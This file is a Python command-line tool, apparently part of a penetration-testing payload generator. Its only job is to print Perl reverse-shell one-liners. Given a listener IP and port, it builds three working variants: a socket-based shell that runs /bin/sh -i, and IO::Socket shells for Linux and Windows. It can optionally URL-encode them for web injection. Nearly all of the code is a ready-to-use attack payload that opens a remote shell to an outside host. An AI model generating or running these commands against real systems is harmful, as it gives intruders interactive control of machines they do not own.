import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("-v", "--variant", default="1", type=click.Choice(["1", "2", "3"]),
              help="Variant: 1=socket (default), 2=IO::Socket Linux, 3=IO::Socket Windows")
def command(listener_ip, listener_port, raw, urlencode, variant):
    """Return Perl reverse shell"""
    if variant == "1":
        cmd = (f"perl -e 'use Socket;$i=\"{listener_ip}\";$p={listener_port};"
               f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
               f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
               f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'")
    elif variant == "2":
        cmd = (f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{listener_ip}:{listener_port}\");"
               f"STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
    else:
        cmd = (f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{listener_ip}:{listener_port}\");"
               f"STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
    if urlencode:
        cmd = quote(cmd)
    label = {"1": "Perl reverse shell", "2": "Perl IO::Socket (Linux)", "3": "Perl IO::Socket (Windows)"}[variant]
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}{label}:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
